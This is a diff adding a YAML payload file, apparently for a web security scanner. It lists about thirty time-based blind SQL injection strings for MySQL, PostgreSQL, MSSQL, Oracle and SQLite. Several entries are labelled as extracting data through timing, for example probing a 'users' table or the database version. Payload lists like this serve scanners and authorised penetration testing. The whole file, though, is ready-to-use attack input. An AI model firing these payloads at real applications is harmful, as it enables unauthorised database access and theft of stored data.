@@ -1,0 +1,141 @@
+name: "SQLi Time-Based Blind Payloads"
+description: "SQL injection payloads for time-based blind injection"
+attack_type: "sqli"
+category: "blind-time"
+
+payloads:
+  # MySQL time-based
+  - value: "' AND SLEEP(5)--"
+    description: "MySQL SLEEP 5 seconds"
+    tags: ["time", "mysql", "sleep"]
+
+  - value: "' AND SLEEP(5)#"
+    description: "MySQL SLEEP hash comment"
+    tags: ["time", "mysql", "sleep"]
+
+  - value: "' OR SLEEP(5)--"
+    description: "MySQL OR SLEEP"
+    tags: ["time", "mysql", "sleep", "or"]
+
+  - value: "1' AND SLEEP(5)--"
+    description: "Numeric context SLEEP"
+    tags: ["time", "mysql", "sleep", "numeric"]
+
+  - value: "' AND IF(1=1,SLEEP(5),0)--"
+    description: "MySQL conditional SLEEP"
+    tags: ["time", "mysql", "conditional"]
+
+  - value: "' AND IF(1=2,SLEEP(5),0)--"
+    description: "MySQL conditional false"
+    tags: ["time", "mysql", "conditional"]
+
+  - value: "' AND (SELECT SLEEP(5))--"
+    description: "MySQL subquery SLEEP"
+    tags: ["time", "mysql", "subquery"]
+
+  - value: "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--"
+    description: "MySQL data exfil via time"
+    tags: ["time", "mysql", "extraction"]
+
+  - value: "' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--"
+    description: "MySQL version via time"
+    tags: ["time", "mysql", "version"]
+
+  - value: "' AND BENCHMARK(10000000,SHA1('test'))--"
+    description: "MySQL BENCHMARK delay"
+    tags: ["time", "mysql", "benchmark"]
+
+  # PostgreSQL time-based
+  - value: "'; SELECT pg_sleep(5)--"
+    description: "PostgreSQL pg_sleep"
+    tags: ["time", "postgresql", "sleep"]
+
+  - value: "' AND (SELECT pg_sleep(5))--"
+    description: "PostgreSQL subquery sleep"
+    tags: ["time", "postgresql", "sleep"]
+
+  - value: "' OR (SELECT pg_sleep(5))--"
+    description: "PostgreSQL OR sleep"
+    tags: ["time", "postgresql", "sleep", "or"]
+
+  - value: "' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"
+    description: "PostgreSQL CASE sleep"
+    tags: ["time", "postgresql", "conditional"]
+
+  - value: "' AND (SELECT CASE WHEN (COUNT(*)>0) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--"
+    description: "PostgreSQL data exfil"
+    tags: ["time", "postgresql", "extraction"]
+
+  - value: "1;SELECT pg_sleep(5)--"
+    description: "PostgreSQL stacked sleep"
+    tags: ["time", "postgresql", "stacked"]
+
+  # MSSQL time-based
+  - value: "'; WAITFOR DELAY '0:0:5'--"
+    description: "MSSQL WAITFOR DELAY"
+    tags: ["time", "mssql", "waitfor"]
+
+  - value: "' AND (SELECT COUNT(*) WHERE WAITFOR DELAY '0:0:5')--"
+    description: "MSSQL conditional WAITFOR"
+    tags: ["time", "mssql", "waitfor"]
+
+  - value: "1; WAITFOR DELAY '0:0:5'--"
+    description: "MSSQL stacked WAITFOR"
+    tags: ["time", "mssql", "stacked"]
+
+  - value: "'; IF (1=1) WAITFOR DELAY '0:0:5'--"
+    description: "MSSQL IF WAITFOR"
+    tags: ["time", "mssql", "conditional"]
+
+  - value: "'; IF (EXISTS(SELECT * FROM users)) WAITFOR DELAY '0:0:5'--"
+    description: "MSSQL EXISTS time"
+    tags: ["time", "mssql", "extraction"]
+
+  # Oracle time-based
+  - value: "' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1--"
+    description: "Oracle DBMS_PIPE delay"
+    tags: ["time", "oracle", "pipe"]
+
+  - value: "' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1 END FROM dual)--"
+    description: "Oracle conditional delay"
+    tags: ["time", "oracle", "conditional"]
+
+  - value: "' AND UTL_INADDR.get_host_address('10.0.0.1')--"
+    description: "Oracle network delay"
+    tags: ["time", "oracle", "network"]
+
+  - value: "' AND DBMS_LOCK.SLEEP(5)--"
+    description: "Oracle DBMS_LOCK SLEEP"
+    tags: ["time", "oracle", "sleep"]
+
+  # SQLite time-based
+  - value: "' AND (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 0 END)--"
+    description: "SQLite heavy query delay"
+    tags: ["time", "sqlite", "heavy-query"]
+
+  # Heavy query alternatives (database agnostic)
+  - value: "' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)--"
+    description: "Cross join delay"
+    tags: ["time", "heavy-query", "cross-join"]
+
+  # Parenthesis variations
+  - value: "') AND SLEEP(5)--"
+    description: "Paren close time"
+    tags: ["time", "mysql", "parenthesis"]
+
+  - value: "')) AND SLEEP(5)--"
+    description: "Double paren time"
+    tags: ["time", "mysql", "parenthesis"]
+
+  - value: "1) AND SLEEP(5)--"
+    description: "Numeric paren time"
+    tags: ["time", "mysql", "parenthesis"]
+
+  # Integer context
+  - value: "1 AND SLEEP(5)"
+    description: "Integer time injection"
+    tags: ["time", "mysql", "integer"]
+
+  - value: "1; SELECT SLEEP(5)"
+    description: "Integer stacked time"
+    tags: ["time", "mysql", "stacked", "integer"]
